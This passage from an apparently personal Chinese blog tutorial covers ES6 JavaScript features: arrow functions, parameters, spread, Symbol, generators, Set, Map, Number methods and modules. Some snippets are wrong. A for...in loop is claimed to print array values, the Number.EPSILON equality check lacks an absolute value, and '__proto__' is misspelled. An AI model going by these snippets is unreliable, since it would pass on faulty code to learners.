<span class="hljs-string">&#x27;v&#x27;</span>;<br><span class="hljs-keyword">let</span> oppsite = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`r`</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> godv = &#123;<br>    god,<br>    oppsite,<br>    <span class="hljs-function"><span class="hljs-title">improve</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;简化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="C6-箭头函数"><a href="#C6-箭头函数" class="headerlink" title="C6.箭头函数"></a>C6.箭头函数</h2><p>允许使用箭头定义函数</p><p>函数体基本一致</p><p>主要是声明不一样</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">let great = <span class="hljs-function"><span class="hljs-params">(a, b)</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(a+b);<br>&#125;<br></code></pre></td></tr></table></figure><p>而且函数的this不一样，是静态的</p><p>this永远留在函数声明时候的this</p><p>主要是使用call方法调用的时候</p><p><code>call(obj, p, p)</code>，第一个参数是this的指向，其他参数是传入的实参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">window</span>.name = <span class="hljs-string">&#x27;ztdgz&#x27;</span><br><span class="hljs-keyword">let</span> school = &#123;<br>    <span class="hljs-attr">name</span> :<span class="hljs-string">&quot;swpu&quot;</span><br>&#125;<br><span class="hljs-keyword">let</span> great = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.name);<br>&#125;<br><span class="hljs-keyword">let</span> great2= <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.name);<br>&#125;<br><br>great.call(school);<span class="hljs-comment">//ztdgz</span><br>great2.call(school);<span class="hljs-comment">//swpu</span><br></code></pre></td></tr></table></figure><p>箭头函数不能作为构造函数创建实例化对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = <span class="hljs-function">(<span class="hljs-params">name, age</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name<br>    <span class="hljs-built_in">this</span>.age = age<br>&#125;<br><br><span class="hljs-keyword">let</span> me = <span class="hljs-keyword">new</span> person()<br></code></pre></td></tr></table></figure><p>这样子的代码会报错，显示<code>person is not  a constructor</code></p><p> 而且不能使用<code>arguments</code>变量</p><p><code>arguements</code>对象是对象中用于获取实参类数组的一个对象</p><p>下面代码本来应该获得一个 伪数组 <strong>0号元素是name，1号元素是age</strong></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">     let person = <span class="hljs-function"><span class="hljs-params">(name, age)</span> =&gt;</span> &#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">arguments</span>)<br>     &#125;<br></code></pre></td></tr></table></figure><p>也就是说，这样子打印会报错</p><p>还可以省略小括号（当形参有且只有一个的时候）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">     <span class="hljs-keyword">let</span> person = <span class="hljs-function"><span class="hljs-params">age</span> =&gt;</span> &#123;<br><span class="hljs-built_in">console</span>.log(age)<br>     &#125;<br></code></pre></td></tr></table></figure><p>省略花括号，（函数体之后一条语句）同时也不能写return语句，return的内容就是后面语句的执行结果</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">let pow = <span class="hljs-built_in">n</span> =&gt; <span class="hljs-built_in">n</span>*<span class="hljs-built_in">n</span>;<br></code></pre></td></tr></table></figure><p>这里再介绍一下：<code>_proto_</code></p><h3 id="more：-proto"><a href="#more：-proto" class="headerlink" title="more：_proto_"></a>more：<code>_proto_</code></h3><p><code>_proto_</code>是对象中的一个属性，这个属性指向这个对象的原型也就是prototype</p><p><strong>如果你设置了__proto，就是修改了当前对象的原型链</strong>。</p><ol><li>构造a对象的构造函数是A，那么a.<strong>proto</strong>：</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">a</span>.__proto__ === <span class="hljs-type">A</span>.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>2.A.prototype.__proto呢？可能会有人回答是Function.prototype，A的构造函数不是Function嘛，那可以明确告诉你，A.prototype.__proto__不是指向Function.prototype，而是指向Object.prototype，为啥呢，因为A.prototype，而不是A，A的构造函数是Function，但是A.prototype可不是，它是一个对象，那它的构造函数是Object，所以：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">A</span>.</span></span>prototype.__proto__<span class="hljs-operator"> === </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Object</span>.</span></span>prototype<br></code></pre></td></tr></table></figure><p>3.然后是一切的尽头，<code>object.prototype._proto_</code></p><p>这个最终指向的是null</p><h2 id="C7-函数参数默认值"><a href="#C7-函数参数默认值" class="headerlink" title="C7.函数参数默认值"></a>C7.函数参数默认值</h2><p>1.函数在形参写入时放入初始值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> oppsite = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">a,b=<span class="hljs-number">10</span> </span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(b);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是调用时实参会将默认值顶掉，所以一般默认值放在形参的最后</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">oppsite</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">12</span>)</span></span><br><span class="hljs-comment">//此時b=12</span><br></code></pre></td></tr></table></figure><p>2.写入形参可以结构赋值</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">let <span class="hljs-function"><span class="hljs-keyword">fun</span> = <span class="hljs-title">function</span> <span class="hljs-params">(&#123;name, age, sex&#125;)</span></span> &#123;<br>    console.log(name);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(&#123;</span></span><br><span class="hljs-params"><span class="hljs-function">    name: &quot;<span class="hljs-type">tony</span>&quot;,</span></span><br><span class="hljs-params"><span class="hljs-function">    age: &quot;18&quot;,</span></span><br><span class="hljs-params"><span class="hljs-function">    sex: &quot;<span class="hljs-type">male</span>&quot;</span></span><br><span class="hljs-params"><span class="hljs-function">&#125;)</span></span><br></code></pre></td></tr></table></figure><p>还有es6加入的rest参数，也就是我们熟悉的<code>...args</code></p><p><img src="https://img-blog.csdnimg.cn/7ca82e1a8c28468f94628ede278934c1.png" alt="rest参数"></p><p>和rest很像的还有一个扩展运算符</p><h3 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h3><p><img src="https://img-blog.csdnimg.cn/c22b8b9650b7464ab6941e7ffdd5e230.png" alt="扩展运算符"></p><p>不使用<code>...</code>得到的arguments中只有一个参数是一个数组（tfboys）</p><p>使用之后arguments分别得到了数组中的三个元素</p><p>可以实现数组合并</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> a = [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>]<br><span class="hljs-keyword">let</span> b = [<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>]<br><span class="hljs-keyword">let</span> ab = [...a, ...b]<br><span class="hljs-built_in">console</span>.log(ab);<span class="hljs-comment">//得到 a,b,c,d</span><br></code></pre></td></tr></table></figure><p>还可以复制数组</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">let</span> d = <span class="hljs-meta">[</span><span class="hljs-params">...</span>a<span class="hljs-meta">]</span><br></code></pre></td></tr></table></figure><p>和伪数组转化为真实数组</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">let</span> divs = document.<span class="hljs-keyword">query</span>SelectorAll(<span class="hljs-string">&quot;div&quot;</span>)//<span class="hljs-keyword">query</span>Selector获取到的是伪数组，原型上是object<br><span class="hljs-keyword">let</span> <span class="hljs-keyword">div</span>Arr = [...divs]<br></code></pre></td></tr></table></figure><h2 id="C8-symbol数据类型"><a href="#C8-symbol数据类型" class="headerlink" title="C8.symbol数据类型"></a>C8.symbol数据类型</h2><p>此中</p><p>s2和s3不相等</p><p>但是Symbol.for得到的两个对象相等（s4 === s5）</p><p><img src="https://img-blog.csdnimg.cn/0dc0adff76474559aa77e08df6327150.png" alt="symbol数据类型"></p><p>Symbol还可以用于给对象添加特定的元素</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">let game = &#123;<br>    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">10</span>,<br>    <span class="hljs-selector-tag">b</span>: <span class="hljs-number">2</span><br>&#125;<br><br>let methods = &#123;<br>    <span class="hljs-selector-tag">a</span>: Symbol(),<br>    <span class="hljs-selector-tag">b</span>: Symbol()<br>&#125;<br><br>game<span class="hljs-selector-attr">[methods.a]</span> = <span class="hljs-number">2</span><br>game<span class="hljs-selector-attr">[methods.b]</span> = <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>这样子做不会覆盖原先a，b的值，会创建两个新的symbol变量</p><p>或者使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">let game = &#123;<br>    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">10</span>,<br>    <span class="hljs-selector-tag">b</span>: <span class="hljs-number">2</span>，<br>    <span class="hljs-selector-attr">[Symbol(<span class="hljs-string">&#x27;a&#x27;</span>)]</span>: <span class="hljs-number">2</span>,<br>    <span class="hljs-selector-attr">[Symbol(<span class="hljs-string">&#x27;b&#x27;</span>)]</span>: <span class="hljs-number">3</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>es6通过<code>Symbol.iterator</code>支持<code>for...of</code>循环</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> game = [<span class="hljs-string">&#x27;dota&#x27;</span>,<span class="hljs-string">&#x27;lol&#x27;</span>,<span class="hljs-string">&#x27;cs&#x27;</span>]<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> v <span class="hljs-keyword">in</span> game)&#123;<br>    <span class="hljs-built_in">console</span>.log(v);<br>&#125;<br><span class="hljs-comment">//结果 dota lol cs</span><br></code></pre></td></tr></table></figure><p>和<code>for...in</code>很像，但是得到的<strong>是值，不是键</strong></p><p>迭代器的作用远不止于此</p><p>有关生成器函数（异步编程的解决方案）</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua">   // 生成器函数 使用*作为前缀<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> * <span class="hljs-title">gen</span><span class="hljs-params">()</span></span> &#123;<br>       console.<span class="hljs-built_in">log</span>(<span class="hljs-number">111</span>);<br>       <span class="hljs-built_in">yield</span> <span class="hljs-string">&#x27;一只没有耳朵&#x27;</span><br>       console.<span class="hljs-built_in">log</span>(<span class="hljs-number">222</span>);<br>       <span class="hljs-built_in">yield</span> <span class="hljs-string">&#x27;一只没有尾巴&#x27;</span><br>       console.<span class="hljs-built_in">log</span>(<span class="hljs-number">333</span>);<br>       <span class="hljs-built_in">yield</span> <span class="hljs-string">&#x27;真奇怪&#x27;</span><br>       console.<span class="hljs-built_in">log</span>(<span class="hljs-number">444</span>);<br>   &#125;<br><br>//gen()其实是一个迭代器对象<br>   let iterator = gen()<br>   //使用<span class="hljs-built_in">next</span>()方法执行到下一个代码块<br>   iterator.<span class="hljs-built_in">next</span>()<br>   iterator.<span class="hljs-built_in">next</span>()<br>   iterator.<span class="hljs-built_in">next</span>()<br>   iterator.<span class="hljs-built_in">next</span>()<br></code></pre></td></tr></table></figure><p>其中yield将函数体分割成了四个部分</p><p>第一次调用next()，执行           </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>);<br><span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;一只没有耳朵&#x27;</span><br><span class="hljs-comment">//只会得到 111</span><br></code></pre></td></tr></table></figure><p>或者使用</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">for</span>(v of iterator)&#123;<br>    <span class="hljs-selector-tag">console</span><span class="hljs-selector-class">.log</span>(v);<br>&#125;<br><br><span class="hljs-comment">//会得到 111 一只没有耳朵</span><br></code></pre></td></tr></table></figure><p>next函数可以放入参数，next()函数的参数作为上一个yield语句的返回结果（本来是undefined），加了参数之后就是aaa</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 生成器函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> * <span class="hljs-title">gen</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>);<br>    <span class="hljs-keyword">let</span> a = <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;一只没有耳朵&#x27;</span><br>    <span class="hljs-built_in">console</span>.log(a);<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;一只没有尾巴&#x27;</span><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">333</span>);<br>    <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;真奇怪&#x27;</span><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">444</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> iterator = gen()<br>iterator.next()<br>iterator.next(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br><span class="hljs-comment">//此时gen()函数中a的值是aaa</span><br></code></pre></td></tr></table></figure><h2 id="C9-Set集合"><a href="#C9-Set集合" class="headerlink" title="C9.Set集合"></a>C9.Set集合</h2><p><img src="https://img-blog.csdnimg.cn/d19ae367c4514b70a116d011752200ae.png" alt="集合"></p><p>主要是对于集合的操作和集合的成员唯一性</p><p>集合操作</p><p>主要就是用到了我们上面介绍的方法</p><p><code>has()</code>是其中比较重要的方法</p><p><img src="https://img-blog.csdnimg.cn/a76afbb4713545259c49baa1489ff80c.png" alt="集合操作"></p><p><img src="https://img-blog.csdnimg.cn/30554d7e76824899b75a6f57f0426ce3.png" alt="差集"></p><h2 id="C10-Map"><a href="#C10-Map" class="headerlink" title="C10.Map"></a>C10.Map</h2><p>Map和Set一样，也是es6提出的一种数据结构</p><p><img src="https://img-blog.csdnimg.cn/4ba41433b7c74b659e71f0894d29ab77.png" alt="Map"></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//创建新Map</span><br><span class="hljs-keyword">let</span> m = <span class="hljs-literal">new</span> <span class="hljs-built_in">Map</span>()<br><br><span class="hljs-comment">//键为字符串</span><br>m.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;swpu&#x27;</span>)<br><br><span class="hljs-comment">//键也可以为对象</span><br><span class="hljs-keyword">let</span> key = &#123;<br>    name:<span class="hljs-string">&#x27;swpu&#x27;</span><br>&#125;<br>m.<span class="hljs-built_in">set</span>(key,<span class="hljs-meta">[</span><span class="hljs-string">&#x27;chengdu&#x27;</span>,<span class="hljs-string">&#x27;nanchong&#x27;</span><span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><p>遍历m的时候会得到一个个的数组，每个数组的第一个元素是键，第二个元素是值</p><h2 id="C11-数值转换"><a href="#C11-数值转换" class="headerlink" title="C11.数值转换"></a>C11.数值转换</h2><h3 id="1-Number-EPSILON"><a href="#1-Number-EPSILON" class="headerlink" title="1.Number.EPSILON"></a>1.Number.EPSILON</h3><p>是js中最小的精度</p><p>比如计算</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> a = <span class="hljs-number">0</span>.<span class="hljs-number">1</span> + <span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">let</span> b = <span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">console</span>.log(a == b);<br></code></pre></td></tr></table></figure><p>打印结果是false，因为a的结果是0.3000…4</p><p>所以我们为了完善这部分，使用一个函数进行判断</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> eql = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(a-b&lt;<span class="hljs-built_in">Number</span>.EPSILON)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Number-isFinit"><a href="#2-Number-isFinit" class="headerlink" title="2.Number.isFinit"></a>2.Number.isFinit</h3><p>判断一个数字是否为有限数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">Number</span>.<span class="hljs-built_in">isFinite</span>(<span class="hljs-number">100</span>));<br></code></pre></td></tr></table></figure><h3 id="3-Number-isNaN"><a href="#3-Number-isNaN" class="headerlink" title="3.Number.isNaN"></a>3.Number.isNaN</h3><p>判断一个数字是否为NaN</p><h3 id="4-Number-parseInt-Number-parseFloat，Number-isInteger"><a href="#4-Number-parseInt-Number-parseFloat，Number-isInteger" class="headerlink" title="4.Number.parseInt , Number.parseFloat，Number.isInteger"></a>4.Number.parseInt , Number.parseFloat，Number.isInteger</h3><p>用于字符串转换为int和float类型</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">let</span> love = <span class="hljs-built_in">Number</span>.<span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&#x27;5211314love&#x27;</span>)<br></code></pre></td></tr></table></figure><p>转换出来的结果是：5211314</p><p><code>Number.isInteger</code>用于判断数值是否为整数</p><h3 id="5-Math-trunc"><a href="#5-Math-trunc" class="headerlink" title="5.Math.trunc"></a>5.Math.trunc</h3><p>用于抹除小数部分</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">let</span> <span class="hljs-built_in">tr</span> = Math.<span class="hljs-built_in">trunc</span>(<span class="hljs-number">3.6</span>)<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">tr</span>);<br></code></pre></td></tr></table></figure><p>结果为3</p><h3 id="6-Math-sign"><a href="#6-Math-sign" class="headerlink" title="6.Math.sign"></a>6.Math.sign</h3><p>判断一个数值是正数还是负数还是0</p><p>正数输出为1</p><p>0输出为0</p><p>负数输出为-1</p><h2 id="C12-对象方法的扩展"><a href="#C12-对象方法的扩展" class="headerlink" title="C12.对象方法的扩展"></a>C12.对象方法的扩展</h2><p>1.is</p><p><code>Object.is()</code>用于比较两个值相等</p><p>和<code>===</code>不同在于NaN的处理上</p><p>is可以实现<code>Object.is(NaN,NaN) ==&gt; true</code></p><p>2.assign</p><p>两个对象使用assign方法</p><p>相同的属性名称会覆盖</p><p>不同的属性名称会照常显示</p><p><img src="https://img-blog.csdnimg.cn/4635eb8b43f94b9fa28760afc4863e3a.png" alt="对象方法的扩展"></p><p>3.get/setPrototypeOf</p><p>用于设置原型类型和获取原型类型</p><p>如下在使用setPrototypeOf之后：</p><p>school的原型对象变成了cities</p><p>再往上的原型对象才是object</p><p><img src="https://img-blog.csdnimg.cn/85974e0875744dfc8f0d72763da2539b.png" alt="对象扩展2"></p><h2 id="C13-模块化"><a href="#C13-模块化" class="headerlink" title="C13.模块化"></a>C13.模块化</h2><p>模块化使用与将大文件拆分为小文件</p><p>使用export和import进行链接</p><p>需要暴露的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> school = <span class="hljs-string">&quot;swpu&quot;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">teach</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;learning&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>外部引入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Export<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> m1 <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./m1.js&quot;</span></span><br><span class="javascript">        <span class="hljs-built_in">console</span>.log(m1);</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可能会存在跨域问题，可以使用live Server打开</p><p>得到：module模块下的这些参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Module<br>school: <span class="hljs-string">&quot;swpu&quot;</span><br>teach: ƒ teach()<br>Symbol(Symbol.toStringTag): <span class="hljs-string">&quot;Module&quot;</span><br><span class="hljs-builtin-name">get</span> school: ƒ ()<br><span class="hljs-builtin-name">set</span> school: ƒ ()<br><span class="hljs-builtin-name">get</span> teach: ƒ ()<br><span class="hljs-builtin-name">set</span> teach: ƒ ()<br></code></pre></td></tr></table></figure><p>或者使用统一暴露</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">let</span> school = <span class="hljs-string">&quot;swpu&quot;</span><br><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">teach</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;learning&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">export</span>&#123;school, teach&#125;<br></code></pre></td></tr></table></figure><p>还有默认暴露，但是默认暴露的数据是封装在module下default对象（Object）下的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">school</span> : <span class="hljs-string">&quot;swpu&quot;</span>,<br>    <span class="hljs-attr">teach</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span 